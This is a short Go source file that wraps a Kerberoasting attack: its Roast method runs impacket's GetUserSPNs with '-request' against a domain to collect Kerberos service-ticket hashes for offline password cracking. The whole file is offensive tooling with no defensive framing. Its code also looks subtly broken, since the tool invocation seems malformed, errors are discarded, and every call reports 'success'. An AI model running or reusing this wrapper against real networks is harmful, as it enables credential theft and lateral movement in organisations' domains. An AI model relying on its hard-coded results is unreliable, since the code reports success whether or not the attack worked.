package kerberos

import "os/exec"

type KerberoastResult struct {
	User   string
	Status string
	Hash   string
}

type Kerberoast struct {
	Domain string
}

func (k Kerberoast) Roast() KerberoastResult {
	cmd := exec.Command("impacket", "GetUserSPNs", k.Domain+"/", "-request")
	out, _ := cmd.Output()
	return KerberoastResult{User: "all", Status: "success", Hash: string(out)}
}
